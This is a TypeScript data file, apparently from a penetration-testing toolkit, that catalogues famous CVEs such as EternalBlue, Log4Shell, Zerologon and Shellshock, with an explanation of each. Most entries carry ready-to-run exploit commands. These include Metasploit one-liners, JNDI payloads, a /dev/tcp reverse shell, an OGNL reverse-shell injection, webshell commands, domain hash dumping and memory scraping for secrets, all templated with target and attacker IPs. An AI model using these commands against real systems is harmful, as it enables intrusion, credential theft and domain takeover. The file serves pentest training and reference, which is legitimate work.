/**
 * CVE Vault — the vulnerabilities that actually matter, with context: what it
 * is, why it mattered, and how it is used. Exploit commands fill from the
 * Variable Console. Structured data; adding a CVE is a data entry.
 */
import type { Cmd } from './commands.ts';

export interface CVE {
  id: string;          // CVE id
  name: string;        // memorable name
  severity: string;    // critical / high / ...
  env: string;         // windows / linux / web / ad
  affected: string;
  what: string;        // what it is
  why: string;         // why it mattered
  exploit: Cmd[];      // reuses the command row (copyable + variable-filled)
  refs: { label: string; url: string }[];
}

export const CVES: CVE[] = [
  {
    id: 'CVE-2017-0144', name: 'EternalBlue', severity: 'critical', env: 'windows',
    affected: 'Windows SMBv1 (MS17-010) · unpatched 7 / 2008 / 2012',
    what: 'A buffer overflow in SMBv1 lets an unauthenticated attacker run code as SYSTEM.',
    why: 'Powered WannaCry and NotPetya. Still the fastest win on legacy internal networks and a rite of passage on HTB/OSCP.',
    exploit: [
      { cmd: 'nmap -p445 --script smb-vuln-ms17-010 <TARGET-IP>', desc: 'Confirm the target is vulnerable' },
      { cmd: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET-IP>; set LHOST <YOUR-IP>; run"', desc: 'Exploit with Metasploit' },
      { cmd: 'python3 send_and_execute.py <TARGET-IP> shell.exe', desc: 'Manual (AutoBlue) if you cannot use MSF' },
    ],
    refs: [{ label: 'MS17-010', url: 'https://learn.microsoft.com/security-updates/securitybulletins/2017/ms17-010' }],
  },
  {
    id: 'CVE-2021-44228', name: 'Log4Shell', severity: 'critical', env: 'web',
    affected: 'Apache Log4j 2.0-beta9 to 2.14.1',
    what: 'A logged string like ${jndi:ldap://…} makes Log4j fetch and run remote Java · unauthenticated RCE.',
    why: 'One of the most widespread vulns ever · nearly every Java app logs user input somewhere. Test every input, not just the obvious ones.',
    exploit: [
      { cmd: '${jndi:ldap://<YOUR-IP>:1389/a}', desc: 'The payload · drop it in headers (User-Agent, X-Forwarded-For), fields, anywhere logged' },
      { cmd: 'java -jar JNDIExploit.jar -i <YOUR-IP>', desc: 'Stand up the JNDI + HTTP callback server' },
      { cmd: "curl http://<TARGET-IP>:8080/ -H 'User-Agent: ${jndi:ldap://<YOUR-IP>:1389/Basic/Command/Base64/<CMD-B64>}'", desc: 'Deliver a base64 command via a logged header' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' }],
  },
  {
    id: 'CVE-2020-1472', name: 'Zerologon', severity: 'critical', env: 'ad',
    affected: 'Windows Server DCs (Netlogon) before Aug 2020 patch',
    what: 'A crypto flaw in Netlogon lets an attacker with network access to a DC set its machine account password to empty · instant Domain Admin.',
    why: 'Unauthenticated domain takeover from a single network foothold. Devastating and trivial to run.',
    exploit: [
      { cmd: 'python3 zerologon_tester.py <DC-NETBIOS> <DC-IP>', desc: 'Check if the DC is vulnerable' },
      { cmd: 'python3 cve-2020-1472-exploit.py <DC-NETBIOS> <DC-IP>', desc: 'Zero the DC machine-account password' },
      { cmd: 'impacket-secretsdump -no-pass -just-dc <DOMAIN>/<DC-NETBIOS>\\$@<DC-IP>', desc: 'DCSync all hashes (then restore the machine password!)' },
    ],
    refs: [{ label: 'Secura whitepaper', url: 'https://www.secura.com/whitepapers/zerologon-whitepaper' }],
  },
  {
    id: 'CVE-2021-34527', name: 'PrintNightmare', severity: 'critical', env: 'windows',
    affected: 'Windows Print Spooler (most versions, 2021)',
    what: 'The Print Spooler lets an authenticated user load a malicious driver DLL · RCE / local privesc to SYSTEM.',
    why: 'Works remotely and locally, and Spooler runs by default on DCs. A reliable AD escalation.',
    exploit: [
      { cmd: 'impacket-rpcdump @<TARGET-IP> | egrep "MS-RPRN|MS-PAR"', desc: 'Confirm the Spooler interface is exposed' },
      { cmd: 'python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET-IP> \\\\<YOUR-IP>\\share\\evil.dll', desc: 'Load your DLL via the Spooler' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-34527' }],
  },
  {
    id: 'CVE-2021-4034', name: 'PwnKit', severity: 'high', env: 'linux',
    affected: 'polkit pkexec (default on almost every Linux distro, pre-2022)',
    what: "A memory-corruption bug in pkexec's argument handling gives any local user a root shell.",
    why: 'Nearly universal, no exotic conditions, one clean exploit. The first thing to try for Linux local privesc.',
    exploit: [
      { cmd: 'ls -l /usr/bin/pkexec && pkexec --version', desc: 'Is pkexec present and SUID' },
      { cmd: 'git clone https://github.com/ly4k/PwnKit && cd PwnKit && ./PwnKit', desc: 'Self-contained exploit to root' },
    ],
    refs: [{ label: 'Qualys advisory', url: 'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt' }],
  },
  {
    id: 'CVE-2022-0847', name: 'Dirty Pipe', severity: 'high', env: 'linux',
    affected: 'Linux kernel 5.8 to 5.16.11 / 5.15.25 / 5.10.102',
    what: 'A pipe/page-cache flaw lets an unprivileged user overwrite data in read-only files · overwrite /etc/passwd or a SUID binary to get root.',
    why: 'Clean, reliable local privesc across a wide kernel range with no memory-corruption fragility.',
    exploit: [
      { cmd: 'uname -r', desc: 'Confirm the kernel is in the vulnerable range (5.8 - 5.16.11)' },
      { cmd: 'git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits && cd CVE-2022-0847-DirtyPipe-Exploits && ./compile.sh && ./exploit-1', desc: 'Overwrite a root-owned file to escalate' },
    ],
    refs: [{ label: 'dirtypipe.cm4all.com', url: 'https://dirtypipe.cm4all.com/' }],
  },
  {
    id: 'CVE-2016-5195', name: 'Dirty COW', severity: 'high', env: 'linux',
    affected: 'Linux kernel < 4.8.3 (2007-2016)',
    what: 'A race condition in copy-on-write memory lets a local user write to read-only mappings · overwrite a SUID binary or /etc/passwd for root.',
    why: 'Ancient but everywhere on legacy boxes. The classic old-kernel privesc.',
    exploit: [
      { cmd: 'uname -r', desc: 'Vulnerable if kernel < 4.8.3' },
      { cmd: 'gcc -pthread dirty.c -o dirty -lcrypt && ./dirty <NEW-PASS>', desc: 'Adds a root user "firefart" via /etc/passwd' },
    ],
    refs: [{ label: 'dirtycow.ninja', url: 'https://dirtycow.ninja/' }],
  },
  {
    id: 'CVE-2014-6271', name: 'Shellshock', severity: 'critical', env: 'web',
    affected: 'GNU Bash <= 4.3 (via CGI, DHCP, SSH forced-commands)',
    what: 'Bash executes trailing code in specially-crafted environment variables · RCE anywhere user input reaches a bash env var (classically CGI).',
    why: 'Turned any bash-backed CGI endpoint into unauthenticated RCE. Still lurks on old appliances and routers.',
    exploit: [
      { cmd: 'curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c \'id\'" http://<TARGET-IP>/cgi-bin/status', desc: 'Test via a CGI script (User-Agent becomes an env var)' },
      { cmd: 'curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR-IP>/<LPORT> 0>&1" http://<TARGET-IP>/cgi-bin/test.sh', desc: 'Reverse shell via the same vector' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2014-6271' }],
  },
  {
    id: 'CVE-2018-7600', name: 'Drupalgeddon2', severity: 'critical', env: 'web',
    affected: 'Drupal 7.x < 7.58, 8.x < 8.5.1',
    what: 'Improper input validation in form rendering lets an unauthenticated attacker run PHP · full RCE.',
    why: 'A staple of OSCP-style boxes and real Drupal estates. Fast, reliable, unauthenticated.',
    exploit: [
      { cmd: 'curl http://<TARGET-IP>/CHANGELOG.txt | head -1', desc: 'Fingerprint the Drupal version' },
      { cmd: 'python3 drupalgeddon2.py http://<TARGET-IP>', desc: 'Drop a webshell / get RCE' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2018-7600' }],
  },
  {
    id: 'CVE-2022-22965', name: 'Spring4Shell', severity: 'critical', env: 'web',
    affected: 'Spring Framework < 5.3.18 / 5.2.20 on JDK 9+ (WAR-deployed Tomcat)',
    what: 'A data-binding flaw lets an attacker write a JSP webshell into Tomcat via crafted parameters · unauthenticated RCE.',
    why: 'Hit the ubiquitous Spring/Java stack. Enterprise-relevant and still found on unpatched apps.',
    exploit: [
      { cmd: 'python3 spring4shell.py --url http://<TARGET-IP>:8080/', desc: 'Write and trigger the JSP shell' },
      { cmd: 'curl "http://<TARGET-IP>:8080/shell.jsp?cmd=id"', desc: 'Run commands via the dropped shell' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-22965' }],
  },
  {
    id: 'CVE-2022-30190', name: 'Follina', severity: 'high', env: 'windows',
    affected: 'Windows MSDT via Office documents (2022)',
    what: 'A malicious Office doc invokes ms-msdt: to run PowerShell · code execution on open, even with macros disabled.',
    why: 'A potent phishing/initial-access primitive that bypassed the usual macro defenses.',
    exploit: [
      { cmd: 'python3 follina.py -i <YOUR-IP> -p <LPORT>', desc: 'Generate the malicious doc + host the payload' },
      { cmd: 'nc -lvnp <LPORT>', desc: 'Catch the shell when the target opens the doc' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-30190' }],
  },
  {
    id: 'CVE-2019-0708', name: 'BlueKeep', severity: 'critical', env: 'windows',
    affected: 'Windows RDP · XP / 7 / 2008 / 2008 R2',
    what: 'A use-after-free in RDP lets an unauthenticated attacker run code as SYSTEM · wormable.',
    why: 'The "next WannaCry" scare. On legacy boxes with 3389 open it is a pre-auth SYSTEM shell.',
    exploit: [
      { cmd: 'nmap -p3389 --script rdp-vuln-ms12-020 <TARGET-IP>', desc: 'Probe RDP (and check patch level)' },
      { cmd: 'msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <TARGET-IP>; set LHOST <YOUR-IP>; run"', desc: 'Exploit (can BSOD · use with care)' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2019-0708' }],
  },
  {
    id: 'CVE-2021-34473', name: 'ProxyShell', severity: 'critical', env: 'web',
    affected: 'Microsoft Exchange Server 2013 / 2016 / 2019 (pre Jul 2021)',
    what: 'A chain of three Exchange bugs (SSRF + path confusion + arbitrary write) gives an unauthenticated attacker RCE as SYSTEM.',
    why: 'Mass-exploited against on-prem Exchange worldwide. On any engagement with a legacy Exchange box it is a first check.',
    exploit: [
      { cmd: 'python3 proxyshell.py -t https://<TARGET-IP> -e <USER>@<DOMAIN>', desc: 'Run the chain to drop an ASPX webshell' },
      { cmd: 'curl -k "https://<TARGET-IP>/aspnet_client/shell.aspx?cmd=whoami"', desc: 'Execute commands through the dropped shell (runs as SYSTEM)' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-34473' }],
  },
  {
    id: 'CVE-2023-4966', name: 'Citrix Bleed', severity: 'critical', env: 'web',
    affected: 'Citrix NetScaler ADC / Gateway (pre Oct 2023)',
    what: 'An out-of-bounds read in NetScaler leaks memory, including valid session tokens, to an unauthenticated attacker.',
    why: 'Used to hijack sessions and bypass MFA at scale (ransomware crews leaned on it hard). A leaked token is an authenticated session with no creds.',
    exploit: [
      { cmd: 'curl -k -H "Host: $(python3 -c \'print("a"*24812)\')" "https://<TARGET-IP>/oauth/idp/.well-known/openid-configuration"', desc: 'Over-long Host header leaks session tokens out of memory' },
      { cmd: 'curl -k "https://<TARGET-IP>/" -b "NSC_AAAC=<LEAKED-TOKEN>"', desc: 'Replay a leaked token to ride an authenticated session' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-4966' }],
  },
  {
    id: 'CVE-2021-42278', name: 'noPac (sAMAccountName spoofing)', severity: 'critical', env: 'ad',
    affected: 'Windows AD Domain Controllers (pre Nov 2021 patch)',
    what: 'Chaining sAMAccountName spoofing (42278) with a KDC bug (42287) lets any domain user impersonate a Domain Controller and get a SYSTEM shell.',
    why: 'Low-priv user to Domain Admin with one tool, no rights beyond adding a machine account. Devastating and common on unpatched AD.',
    exploit: [
      { cmd: 'netexec ldap <DC-IP> -u <USER> -p <PASS> -M maq', desc: 'Check MachineAccountQuota > 0 (you must be able to add a computer)' },
      { cmd: 'python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -dc-host <DC-NETBIOS> --impersonate administrator -shell', desc: 'Spoof a DC and pop a SYSTEM shell' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-42278' }],
  },
  {
    id: 'CVE-2023-34362', name: 'MOVEit Transfer', severity: 'critical', env: 'web',
    affected: 'Progress MOVEit Transfer (pre May 2023 patch)',
    what: 'A SQL injection in the MOVEit web app is chained to a .NET deserialization for unauthenticated RCE and mass data theft.',
    why: 'The Cl0p group used it to breach thousands of organizations. A landmark managed-file-transfer supply-chain compromise.',
    exploit: [
      { cmd: 'python3 CVE-2023-34362.py -u https://<TARGET-IP>', desc: 'SQLi to a forged deserialization payload that drops human2.aspx' },
      { cmd: 'curl -k "https://<TARGET-IP>/human2.aspx" -H "X-siLock-Step1: -1"', desc: 'Interact with the dropped webshell to pull data / run code' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-34362' }],
  },
  {
    id: 'CVE-2022-26134', name: 'Confluence OGNL', severity: 'critical', env: 'web',
    affected: 'Atlassian Confluence Server / Data Center (pre Jun 2022)',
    what: 'An OGNL injection in the request URI lets an unauthenticated attacker run arbitrary Java and OS commands.',
    why: 'Instant unauth RCE on a ubiquitous enterprise wiki, exploited in the wild within days of disclosure.',
    exploit: [
      { cmd: 'curl -s "http://<TARGET-IP>/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"', desc: 'OGNL in the URI runs id (URL-encoded)' },
      { cmd: 'curl -s "http://<TARGET-IP>/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22bash+-c+%7Becho%2C<CMD-B64>%7D%7C%7Bbase64%2C-d%7D%7Cbash%22%29%7D/"', desc: 'Base64 a reverse-shell command into the same vector' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-26134' }],
  },
  {
    id: 'CVE-2021-3156', name: 'Baron Samedit (sudo)', severity: 'high', env: 'linux',
    affected: 'sudo 1.8.2 - 1.8.31p2 and 1.9.0 - 1.9.5p1 (default on most Linux)',
    what: "A heap buffer overflow in sudo's argument parsing gives any local user a root shell, with no sudo rights required.",
    why: 'Present by default on nearly every Linux system for a decade. A reliable local privesc when kernel exploits are too risky.',
    exploit: [
      { cmd: "sudoedit -s '\\' $(python3 -c 'print(\"A\"*1000)')", desc: 'Vulnerable if it errors with "sudoedit:" or segfaults; patched shows usage' },
      { cmd: 'git clone https://github.com/blasty/CVE-2021-3156 && cd CVE-2021-3156 && make && ./sudo-hax-me-a-sandwich', desc: 'Compile and run the exploit to get root' },
    ],
    refs: [{ label: 'Qualys advisory', url: 'https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt' }],
  },
  {
    id: 'CVE-2014-0160', name: 'Heartbleed', severity: 'high', env: 'web',
    affected: 'OpenSSL 1.0.1 - 1.0.1f (TLS heartbeat)',
    what: 'A missing bounds check in the TLS heartbeat lets an attacker read up to 64KB of server memory per request, leaking private keys, session cookies, and credentials.',
    why: 'One of the most famous bugs ever. Still lurks on legacy TLS services, and a leaked private key breaks the whole encryption story.',
    exploit: [
      { cmd: 'nmap -p443 --script ssl-heartbleed <TARGET-IP>', desc: 'Confirm the service is vulnerable' },
      { cmd: 'python3 heartbleed.py <TARGET-IP> | grep -aE "pass|session|cookie"', desc: 'Dump memory repeatedly and sift for secrets' },
    ],
    refs: [{ label: 'heartbleed.com', url: 'https://heartbleed.com/' }],
  },
  {
    id: 'CVE-2021-41773', name: 'Apache Path Traversal / RCE', severity: 'critical', env: 'web',
    affected: 'Apache HTTP Server 2.4.49 (and 2.4.50 for the bypass)',
    what: 'A path-normalization flaw lets an attacker traverse outside the document root to read files, and with mod_cgi enabled, achieve remote code execution.',
    why: 'Trivial to exploit against the exact version and a staple of OSCP-style boxes and real estates.',
    exploit: [
      { cmd: 'curl --path-as-is "http://<TARGET-IP>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"', desc: 'Path traversal file read (confirm the version)' },
      { cmd: 'curl --path-as-is -d "echo Content-Type: text/plain; echo; id" "http://<TARGET-IP>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"', desc: 'RCE when mod_cgi is enabled' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773' }],
  },
  {
    id: 'CVE-2020-0796', name: 'SMBGhost', severity: 'critical', env: 'windows',
    affected: 'Windows 10 / Server 1903-1909 (SMBv3.1.1 compression)',
    what: 'A buffer overflow in SMBv3 compression gives wormable pre-auth remote code execution, and a reliable local privilege escalation.',
    why: 'The "next EternalBlue" for modern Windows: wormable, pre-auth, SYSTEM.',
    exploit: [
      { cmd: 'nmap -p445 --script smb-protocols <TARGET-IP>', desc: 'Confirm SMB 3.1.1 with compression' },
      { cmd: 'python3 CVE-2020-0796.py <TARGET-IP>', desc: 'Local privesc or RCE PoC (can BSOD; use with care)' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2020-0796' }],
  },
  {
    id: 'CVE-2021-22205', name: 'GitLab CE RCE', severity: 'critical', env: 'web',
    affected: 'GitLab CE/EE < 13.10.3 / 13.9.6 / 13.8.8',
    what: 'A malicious image passed to a vulnerable bundled ExifTool yields unauthenticated remote code execution.',
    why: 'Mass-exploited in the wild, and GitLab sits at the heart of dev shops (source code, CI secrets, deploy keys).',
    exploit: [
      { cmd: 'curl -s http://<TARGET-IP>/help | grep -i gitlab', desc: 'Fingerprint the GitLab version' },
      { cmd: 'python3 gitlab_rce.py -t http://<TARGET-IP> -l <YOUR-IP> -p <LPORT>', desc: 'Unauthenticated RCE to a reverse shell' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-22205' }],
  },
  {
    id: 'CVE-2021-36942', name: 'PetitPotam', severity: 'critical', env: 'ad',
    affected: 'Windows AD with AD CS web enrollment (unpatched EFSRPC)',
    what: 'Coerces a Domain Controller to authenticate to the attacker via MS-EFSRPC; relayed to AD CS it yields a DC certificate, then a Domain Admin ticket.',
    why: 'A reliable, near-unauthenticated path to full domain takeover wherever AD CS web enrollment is exposed.',
    exploit: [
      { cmd: 'impacket-ntlmrelayx -t http://<CA-HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController', desc: 'Stand up the relay to AD CS first' },
      { cmd: 'python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASS> <YOUR-IP> <DC-IP>', desc: 'Coerce the DC to auth to your relay -> DC certificate' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-36942' }],
  },
  {
    id: 'CVE-2024-6387', name: 'regreSSHion', severity: 'critical', env: 'linux',
    affected: 'OpenSSH sshd 8.5p1 - 9.7p1 on glibc Linux',
    what: 'A signal-handler race condition in sshd gives an unauthenticated attacker remote code execution as root.',
    why: 'Pre-auth root on the single most exposed service on the internet. A 2024 landmark, though exploitation is timing and heap dependent.',
    exploit: [
      { cmd: 'nc <TARGET-IP> 22', desc: 'Grab the banner and confirm a vulnerable OpenSSH version' },
      { cmd: 'python3 regreSSHion.py <TARGET-IP> -p 22', desc: 'Race the signal handler (often needs thousands of attempts)' },
    ],
    refs: [{ label: 'Qualys advisory', url: 'https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt' }],
  },
  {
    id: 'CVE-2024-3400', name: 'PAN-OS GlobalProtect', severity: 'critical', env: 'network',
    affected: 'Palo Alto PAN-OS 10.2 / 11.0 / 11.1 with GlobalProtect · unpatched April 2024',
    what: 'A command injection in the GlobalProtect portal lets an unauthenticated attacker plant a file via a crafted SESSID cookie, then run OS commands as root when the telemetry job fires.',
    why: 'Perimeter firewalls compromised at scale (Operation MidnightEclipse). One unauthenticated request owns the edge device that fronts the whole network.',
    exploit: [
      { cmd: 'curl -sk "https://<TARGET-IP>/global-protect/login.esp" | grep -i version', desc: 'Fingerprint the PAN-OS build' },
      { cmd: 'nuclei -t http/cves/2024/CVE-2024-3400.yaml -u https://<TARGET-IP>', desc: 'Detect the vulnerable portal' },
      { cmd: 'msfconsole -q -x "use exploit/linux/http/panos_telemetry_cmd_exec; set RHOSTS <TARGET-IP>; set LHOST <YOUR-IP>; run"', desc: 'Exploit via the telemetry cron to a root shell' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3400' }],
  },
  {
    id: 'CVE-2024-21887', name: 'Ivanti Connect Secure', severity: 'critical', env: 'network',
    affected: 'Ivanti Connect Secure / Policy Secure 9.x, 22.x · unpatched January 2024',
    what: 'An authentication bypass (CVE-2023-46805) chained with this command injection gives an unauthenticated attacker remote code execution on the VPN appliance.',
    why: 'Mass-exploited by multiple actors in early 2024. The VPN concentrator is the crown jewel of the perimeter, and a shell on it means you are already inside.',
    exploit: [
      { cmd: 'nuclei -t http/cves/2024/CVE-2024-21887.yaml -u https://<TARGET-IP>', desc: 'Detect the auth-bypass + injection chain' },
      { cmd: 'curl -sk "https://<TARGET-IP>/api/v1/totp/user-backup-code/../../license/keys-status/;id;"', desc: 'Auth-bypass path traversal into the injectable license endpoint' },
      { cmd: 'msfconsole -q -x "use exploit/linux/http/ivanti_connect_secure_rce_cve_2024_21887; set RHOSTS <TARGET-IP>; set LHOST <YOUR-IP>; run"', desc: 'Chained exploit to a shell' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21887' }],
  },
  {
    id: 'CVE-2024-1709', name: 'ScreenConnect Auth Bypass', severity: 'critical', env: 'web',
    affected: 'ConnectWise ScreenConnect 23.9.7 and earlier',
    what: 'A path-traversal in the setup wizard lets an unauthenticated attacker reach SetupWizard.aspx and create a brand-new administrator account.',
    why: 'Trivial admin takeover of an RMM that reaches thousands of managed endpoints; weaponized for ransomware within days of disclosure.',
    exploit: [
      { cmd: 'curl -sk "https://<TARGET-IP>/SetupWizard.aspx/anything"', desc: 'Reach the setup wizard past auth (path traversal)' },
      { cmd: 'msfconsole -q -x "use exploit/multi/http/connectwise_screenconnect_rce_cve_2024_1709; set RHOSTS <TARGET-IP>; set LHOST <YOUR-IP>; run"', desc: 'Create an admin, then deploy an extension for RCE' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-1709' }],
  },
  {
    id: 'CVE-2023-27350', name: 'PaperCut MF/NG', severity: 'critical', env: 'web',
    affected: 'PaperCut MF / NG before 20.1.7, 21.2.11, 22.0.9',
    what: 'An access-control flaw on the SetupCompleted page bypasses admin authentication, and the print-script feature then runs arbitrary code.',
    why: 'Exploited by Clop and LockBit affiliates. Print servers sit deep inside networks with broad reach.',
    exploit: [
      { cmd: 'curl -sk "http://<TARGET-IP>:9191/app?service=page/SetupCompleted"', desc: 'Bypass auth into an admin session' },
      { cmd: 'msfconsole -q -x "use exploit/multi/http/papercut_ng_auth_bypass; set RHOSTS <TARGET-IP>; set LHOST <YOUR-IP>; run"', desc: 'Enable print-scripts and get code execution' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-27350' }],
  },
  {
    id: 'CVE-2023-22515', name: 'Confluence Broken Access Control', severity: 'critical', env: 'web',
    affected: 'Atlassian Confluence Data Center / Server 8.0.0 - 8.5.1',
    what: 'A broken-access-control flaw lets an unauthenticated attacker re-open the setup flow and create a new Confluence administrator.',
    why: 'Instant admin on internet-facing Confluence, then RCE via templates. Exploited in the wild before the patch landed.',
    exploit: [
      { cmd: 'curl -sk "http://<TARGET-IP>:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"', desc: 'Reset the setup state to unlock admin creation' },
      { cmd: 'nuclei -t http/cves/2023/CVE-2023-22515.yaml -u http://<TARGET-IP>:8090', desc: 'Detect and confirm exploitability' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-22515' }],
  },
  {
    id: 'CVE-2023-3519', name: 'Citrix NetScaler RCE', severity: 'critical', env: 'network',
    affected: 'Citrix NetScaler ADC / Gateway 13.0 / 13.1 configured as VPN or AAA · July 2023',
    what: 'A stack overflow in the NetScaler gateway gives an unauthenticated attacker remote code execution on the appliance.',
    why: 'Mass web-shell deployment across thousands of internet-facing appliances in the summer of 2023.',
    exploit: [
      { cmd: 'curl -sk "https://<TARGET-IP>/vpn/index.html" -I | grep -i "Last-Modified"', desc: 'Fingerprint the build date' },
      { cmd: 'nuclei -t http/cves/2023/CVE-2023-3519.yaml -u https://<TARGET-IP>', desc: 'Detect the vulnerable gateway' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-3519' }],
  },
  {
    id: 'CVE-2022-1388', name: 'F5 BIG-IP iControl REST', severity: 'critical', env: 'network',
    affected: 'F5 BIG-IP 16.1.x / 15.1.x / 14.1.x / 13.1.x iControl REST',
    what: 'An authentication bypass in iControl REST lets an unauthenticated attacker run arbitrary system commands as root via the bash endpoint.',
    why: 'One request to root on load balancers fronting critical apps. Weaponized within a day of disclosure.',
    exploit: [
      { cmd: 'curl -sku "admin:" "https://<TARGET-IP>/mgmt/tm/util/bash" -H "Content-Type: application/json" -H "X-F5-Auth-Token: x" -H "Connection: keep-alive, X-F5-Auth-Token" -d \'{"command":"run","utilCmdArgs":"-c id"}\'', desc: 'Auth-bypass command execution as root' },
      { cmd: 'msfconsole -q -x "use exploit/linux/http/f5_icontrol_rce; set RHOSTS <TARGET-IP>; set LHOST <YOUR-IP>; run"', desc: 'Get a shell' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-1388' }],
  },
  {
    id: 'CVE-2023-20198', name: 'Cisco IOS XE Web UI', severity: 'critical', env: 'network',
    affected: 'Cisco IOS XE with the HTTP/HTTPS server enabled · October 2023',
    what: 'A privilege-escalation flaw in the web UI lets an unauthenticated attacker create a local level-15 (full admin) account.',
    why: 'Tens of thousands of routers and switches implanted within days; complete control of the device and its traffic.',
    exploit: [
      { cmd: 'curl -sk "https://<TARGET-IP>/webui/logoutconfirm.html?logon_hash=1" -I', desc: 'Confirm the exposed web UI' },
      { cmd: 'nuclei -t http/cves/2023/CVE-2023-20198.yaml -u https://<TARGET-IP>', desc: 'Detect the flaw and check for an existing implant' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-20198' }],
  },
  {
    id: 'CVE-2024-4577', name: 'PHP-CGI Argument Injection', severity: 'critical', env: 'web',
    affected: 'PHP on Windows in CGI mode: 8.1 < 8.1.29, 8.2 < 8.2.20, 8.3 < 8.3.8 (XAMPP by default)',
    what: 'A Windows best-fit encoding flaw lets an unauthenticated attacker smuggle PHP-CGI arguments and execute code.',
    why: 'A 2024 re-break of the classic CVE-2012-1823. XAMPP and Windows PHP stacks are everywhere on internal networks.',
    exploit: [
      { cmd: 'curl -s "http://<TARGET-IP>/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data "<?php system(\'whoami\'); ?>"', desc: 'Argument injection straight to RCE' },
      { cmd: 'nuclei -t http/cves/2024/CVE-2024-4577.yaml -u http://<TARGET-IP>', desc: 'Detect the vulnerable PHP-CGI handler' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-4577' }],
  },
  {
    id: 'CVE-2024-23897', name: 'Jenkins CLI File Read', severity: 'high', env: 'web',
    affected: 'Jenkins 2.441 and earlier, LTS 2.426.2 and earlier (args4j CLI)',
    what: 'The built-in CLI expands @-prefixed arguments into file contents, letting an attacker read arbitrary files · and reach RCE by leaking the secret key.',
    why: 'Jenkins holds the keys to the whole build pipeline; a read of the master key or a credentials file leads to full compromise and supply-chain reach.',
    exploit: [
      { cmd: 'java -jar jenkins-cli.jar -s http://<TARGET-IP>:8080/ help "@/etc/passwd"', desc: 'Leak a file via CLI @-argument expansion' },
      { cmd: 'nuclei -t http/cves/2024/CVE-2024-23897.yaml -u http://<TARGET-IP>:8080', desc: 'Detect the arbitrary-file-read' },
    ],
    refs: [{ label: 'NVD', url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-23897' }],
  },
];

/**
 * CVE -> where it fits in the engagement (curated, grounded). Connects each CVE
 * into the knowledge graph: the methodology that contextualizes it, the exact
 * next technique, or the OWASP category it belongs to. Only clean links; CVEs
 * with no obvious next move (pure initial-access) simply have no related row.
 */
export const CVE_RELATED: Record<string, { label: string; to: string }[]> = {
  'CVE-2017-0144': [{ label: 'Lateral Movement', to: 'library/methodologies#lateral-movement' }, { label: 'Mimikatz', to: 'technique/mimikatz' }],
  'CVE-2021-44228': [{ label: 'Web Testing', to: 'library/methodologies#web-testing' }, { label: 'Payloads', to: 'library/payloads' }],
  'CVE-2020-1472': [{ label: 'AD Attack Path', to: 'library/methodologies#active-directory' }, { label: 'DCSync', to: 'technique/dcsync' }],
  'CVE-2021-34527': [{ label: 'AD Attack Path', to: 'library/methodologies#active-directory' }],
  'CVE-2021-4034': [{ label: 'Privilege Escalation', to: 'library/methodologies#privilege-escalation' }, { label: 'One-Shot Local Root', to: 'technique/one-shot-local-root-pwnkit-baron-samedit' }],
